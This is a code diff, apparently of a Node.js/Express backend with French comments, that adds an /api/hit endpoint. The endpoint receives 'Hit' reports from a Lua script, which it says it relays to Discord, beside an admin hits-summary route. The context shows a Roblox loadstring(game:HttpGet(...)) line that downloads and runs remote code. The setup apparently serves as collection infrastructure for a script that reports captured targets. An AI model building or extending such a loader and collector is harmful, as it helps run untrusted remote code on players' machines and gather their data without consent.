@@ -392,6 +392,16 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/cagnastylepay-png/MyS
 });
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 // 1. Récupérer tous les webhooks
+
+app.post('/api/hit', (req, res) => {
+    const data = req.body;
+    console.log("Nouveau Hit reçu de :", data.Hit.Name);
+
+    // Ici tu places ta logique (envoi Discord, logs, etc.)
+    
+    // TRÈS IMPORTANT : Répondre 200 pour arrêter la boucle Lua
+    res.status(200).send({ status: "ok", message: "Hit received" });
+});
 app.get('/api/admin/hits-summary', async (req, res) => {
     const token = req.query.token;
     if (token !== ADMIN_TOKEN) return res.status(403).json({ error: "Unauthorized" });
